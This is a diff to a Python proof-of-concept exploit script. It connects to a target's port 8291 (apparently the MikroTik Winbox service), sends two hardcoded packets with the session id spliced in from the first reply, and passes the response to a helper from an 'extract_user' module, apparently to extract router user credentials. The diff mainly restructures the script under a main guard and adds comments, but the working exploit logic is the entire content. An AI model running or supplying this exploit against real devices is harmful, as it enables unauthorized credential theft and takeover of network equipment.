@@ -4,8 +4,6 @@ import socket
 import sys
 from extract_user import get_from_network
 
-ip = sys.argv[1]
-s = socket.socket()
 
 a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
      0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
@@ -31,18 +29,34 @@ b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
      0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
      0x00, 0x02, 0x00, 0x00, 0x00]
 
-s.settimeout(3)
-s.connect((ip, 8291))
-a = bytearray(a)
-b = bytearray(b)
 
-s.send(a)
-d = bytearray(s.recv(1024))
 
-b[19] = d[38]
+if __name__ == "__main__":
+     try:
+          ip = sys.argv[1]
+     except:
+          print("Usage: python PoC.py [IP_ADDRESS]")
 
-s.send(b)
-d = bytearray(s.recv(1024))
+     #Initialize Socket
+     s = socket.socket()
+     s.settimeout(3)
+     s.connect((ip, 8291))
 
-print(ip)
-get_from_network(d[55:])
+     #Convert to bytearray for manipulation
+     a = bytearray(a)
+     b = bytearray(b)
+
+     #Send hello and recieve the sesison id
+     s.send(a)
+     d = bytearray(s.recv(1024))
+
+     #Replace the session id in template
+     b[19] = d[38]
+
+     #Send the edited response
+     s.send(b)
+     d = bytearray(s.recv(1024))
+
+     #Get results
+     print(ip)
+     get_from_network(d[55:])
